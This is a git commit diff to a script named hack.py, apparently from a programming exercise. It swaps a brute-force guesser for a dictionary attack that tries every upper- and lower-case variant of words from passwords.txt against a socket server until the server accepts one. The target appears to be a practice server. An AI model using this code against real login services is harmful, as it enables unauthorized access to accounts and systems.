0f3adfb90b83702f757be566710fa311b46cb998
Nikolay-Vasnetsov <kimsofia@protonmail.com>
2021-06-19 23:52:20 +0300

    version 2

--- hack.py
+++ hack.py
@@ -1,33 +1,36 @@
-import socket
 import argparse
-from itertools import combinations_with_replacement
+from itertools import product
+import socket
 
-dictionary = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
-              "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
-              0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
+
+def new_password():
+    with open("passwords.txt", "r") as temp_password:
+        for line in temp_password:
+            word = line.strip()
+            if line.isdigit():
+                yield line
+            else:
+                word_combinations = product(*([letter.lower(), letter.upper()] for letter in word))
+                for word in word_combinations:
+                    yield ''.join(word)
+
 
 parser = argparse.ArgumentParser()
-parser.add_argument("ip")
-parser.add_argument("port")
+parser.add_argument("host", help="Enter IP address")
+parser.add_argument("port", help="Enter port from 1024 to 65535")
+
 args = parser.parse_args()
 
+ip_address = args.host
+port = int(args.port)
+address = (ip_address, port)
+password = new_password()
+response = ""
+
 with socket.socket() as client_socket:
-    hostname = (args.ip, int(args.port))
-
-    client_socket.connect(hostname)
-
-    for i in range(1, 4):
-        for password in combinations_with_replacement(dictionary, i):
-            a = ""
-            for j in password:
-                a += str(j)
-            text = a
-            text = text.encode()
-            client_socket.send(text)
-
-            response = client_socket.recv(1024)
-            response = response.decode()
-            if response == "Connection success!":
-                print(a)
-                break
-
+    client_socket.connect(address)
+    while response != "Connection success!":
+        data = next(password).encode()
+        client_socket.send(data)
+        response = client_socket.recv(1024).decode()
+    print(data.decode())
